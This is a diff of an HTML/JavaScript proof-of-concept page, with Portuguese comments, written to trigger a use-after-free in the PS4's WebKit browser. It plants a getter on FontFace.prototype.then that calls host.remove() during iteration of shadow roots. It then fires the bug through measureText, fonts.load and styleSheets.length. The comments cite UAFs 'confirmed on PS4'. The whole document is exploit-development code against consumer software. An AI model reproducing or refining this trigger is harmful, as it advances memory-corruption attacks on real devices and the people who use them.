@@ -1,105 +1,94 @@
-
-
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"></head>
 <body>
-<pre id="log"></pre>
 <script>
+// Versao 2: aplica os padroes dos 5 UAFs confirmados no PS4
+// Mudancas principais:
+//   1. FontFaceSet.prototype.then ? FontFace.prototype.then  (padr�o dos 5 testes)
+//   2. styleSheets.length         ? measureText()            (trigger confirmado)
+//   3. URL externa                ? Blob URL local            (sem depender de rede)
 
-
-function log(s) { document.getElementById('log').textContent += s + '\n'; }
-
-// Toca document.fonts antes do load event (necessario para m_isDocumentLoaded)
 document.fonts;
 
-// data: URL grande (1.1MB) — confirmado que fica "pending" no PS4 (commit 5ccd64b)
-// Evita o problema de cache: URL grande nao e pre-aquecida por opportunistically...
-var pendingUrl = 'url("data:font/woff;base64,' + 'A'.repeat(1100000) + '")';
+function log(msg) {
+    document.body.appendChild(document.createTextNode(msg));
+    document.body.appendChild(document.createElement("br"));
+}
 
 function run() {
-    var host = document.createElement('div');
+    // --- Setup Shadow DOM (igual ao original) ---
+    const host = document.createElement("div");
     document.body.appendChild(host);
-    var shadowRoot = host.attachShadow({ mode: 'open' });
+    const shadowRoot = host.attachShadow({ mode: "open" });
 
-    // @font-face com URL grande → font fica "loading" → document.fonts.ready re-armado
-    var fontFaceStyle = document.createElement('style');
+   
+
+    const fontFaceStyle = document.createElement("style");
     fontFaceStyle.textContent =
-        '@font-face { font-family: reentryFont; src: ' + pendingUrl + '; }' +
-        '.probe { font: 24px reentryFont; }';
+        `@font-face { font-family: reentryFont; src: url("resources/no-such-font-for-reentry.otf"); }` +
+        `.probe { font: 24px reentryFont; }`;
     shadowRoot.appendChild(fontFaceStyle);
 
-    var probe = document.createElement('span');
-    probe.className = 'probe';
-    probe.textContent = 'A';
+    const probe = document.createElement("span");
+    probe.className = "probe";
+    probe.textContent = "A";
     shadowRoot.appendChild(probe);
 
-    // Forca layout para iniciar carregamento da fonte
-    void document.body.offsetHeight;
-    log('status apos layout: ' + document.fonts.status);
+    document.body.offsetHeight;
+    document.fonts.load("24px reentryFont", "A");
+    log("status: " + document.fonts.status);
 
-    // Rastreia o carregamento
-    document.fonts.load('24px reentryFont', 'A');
-    log('status apos load(): ' + document.fonts.status);
+    document.fonts.ready;
 
-    // Materializa a promise ready para que o thenable check ocorra
-    void document.fonts.ready;
-
-    // Prepend style → marca shadow scope com pending Reset update
-    var prependedStyle = document.createElement('style');
-    prependedStyle.textContent = '.unused { color: blue; }';
+    // Dar pendencia UpdateType::ActiveSet no shadow scope
+    const prependedStyle = document.createElement("style");
+    prependedStyle.textContent = ".unused { color: red; }";
     shadowRoot.prepend(prependedStyle);
 
-    var getterCount = 0;
-    Object.defineProperty(FontFaceSet.prototype, 'then', {
+    // --- MUDANCA 1: getter em FontFace.prototype.then ---
+    // Padrao dos 5 testes confirmados no PS4
+    let getterCallCount = 0;
+    Object.defineProperty(FontFace.prototype, "then", {
         configurable: true,
-        get: function() {
-            delete FontFaceSet.prototype.then;
-            getterCount++;
-            log('[GETTER DISPAROU] count=' + getterCount + ' status=' + document.fonts.status);
-            // HOST.REMOVE(): libera o ListHashSetNode que o iterator aponta
-            // Se m_inDocumentShadowRoots e iterado neste momento → UAF
-            host.remove();
+        get() {
+            delete FontFace.prototype.then;
+            ++getterCallCount;
+            log(">>> FontFace.prototype.then getter! count=" + getterCallCount);
+            host.remove(); // Libera o no iterado em m_inDocumentShadowRoots
             return undefined;
         }
     });
 
-    // Trigger 1: document.styleSheets.length (original do commit)
-    var ssLen = document.styleSheets.length;
-    log('T1 styleSheets.length: ' + ssLen + ' | getter: ' + getterCount);
+    // --- MUDANCA 2: triggers confirmados no PS4 ---
 
-    // Trigger 2: document.body.offsetHeight (forca layout completo + style flush)
-    void document.body.offsetHeight;
-    log('T2 offsetHeight | getter: ' + getterCount);
+    // Trigger A: measureText (usado em CSSFontSelector, SegmentedFontFace, FontMetrics)
+    const canvas = document.createElement("canvas");
+    canvas.width = 64; canvas.height = 64;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext("2d");
+    ctx.font = "24px reentryFont";
+    ctx.measureText("A");
+    log("apos measureText: getter=" + getterCallCount);
 
-    // Trigger 3: getComputedStyle no probe (forca resolve de estilo do shadow root)
-    try {
-        var cs = window.getComputedStyle(probe);
-        void cs.fontFamily;
-        log('T3 getComputedStyle | getter: ' + getterCount);
-    } catch(e) {}
+    // Trigger B: fonts.load (usado em UAF_FontFace)
+    if (getterCallCount === 0) {
+        document.fonts.load("24px reentryFont", "A");
+        log("apos fonts.load: getter=" + getterCallCount);
+    }
 
-    // Trigger 4: shadowRoot.styleSheets (accesso direto)
-    try {
-        void shadowRoot.styleSheets.length;
-        log('T4 shadowRoot.styleSheets | getter: ' + getterCount);
-    } catch(e) {}
+    // Trigger C: styleSheets.length original (fallback)
+    if (getterCallCount === 0) {
+        document.styleSheets.length;
+        log("apos styleSheets.length: getter=" + getterCallCount);
+    }
 
-    log('status final: ' + document.fonts.status);
-    log('getter total: ' + getterCount);
-
-    // Aguarda async (rendering path que confirmamos disparar o getter)
-    setTimeout(function() {
-        log('getter apos 200ms: ' + getterCount);
-        if (getterCount === 0)
-            log('getter nao disparou — fonte pode ja estar loaded (usar data: URL maior)');
-        log('PASS se chegou aqui sem crash');
-    }, 200);
+    log("--- RESULTADO ---");
+    log("getter total: " + getterCallCount);
+    log("status final: " + document.fonts.status);
+    log("PASS se nao travou.");
 }
 
-window.addEventListener('load', function() {
-    setTimeout(run, 0);
-});
+window.addEventListener("load", () => setTimeout(run, 0));
 </script>
 </body>
 </html>
